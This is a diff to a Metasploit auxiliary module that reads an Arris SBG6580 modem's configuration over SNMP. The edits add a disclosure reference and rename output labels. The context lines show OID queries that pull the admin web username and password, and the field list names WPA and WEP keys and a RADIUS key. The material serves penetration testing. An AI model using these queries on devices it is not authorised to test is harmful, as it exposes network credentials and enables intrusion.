@@ -21,6 +21,7 @@ class Metasploit3 < Msf::Auxiliary
         The default community used is "public".',
       'References'  =>
         [
+          [ 'URL', 'http://seclists.org/fulldisclosure/2014/May/79' ],
           [ 'URL', 'http://www.arrisi.com/modems/datasheet/SBG6580/SBG6580_UserGuide.pdf' ],
         ],
       'Author'      => 'Matthew Kienow <mkienow[at]inokii.com>',
@@ -39,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
         "WEP Passphrase", "WEP Encryption", "WEP Key 1", "WEP Key 2",
         "WEP Key 3", "WEP Key 4", "Current Network Key", "WPA Encryption",
         "WPA Pre-Shared Key (PSK)", "RADIUS Server", "RADIUS Port",
-        "RADIUS Key", "Device UI Username", "Device UI Password"
+        "RADIUS Key", "Username", "Password"
       ]
 
       output_data = {}
@@ -128,15 +129,15 @@ class Metasploit3 < Msf::Auxiliary
           # manufacturerLocal(1) - indicates Portal Services is using the vendor
           # web user interface shipped with the device
           deviceUiUsername = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0').to_s
-          output_data["Device UI Username"] = deviceUiUsername.strip
+          output_data["Username"] = deviceUiUsername.strip
 
           deviceUiPassword = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0').to_s
-          output_data["Device UI Password"] = deviceUiPassword.strip
+          output_data["Password"] = deviceUiPassword.strip
         end
 
         # output
         print_line("")
-        print_status("System information:\n")
+        print_status("Device information:\n")
         line = ""
         width = 30  # name field width
 
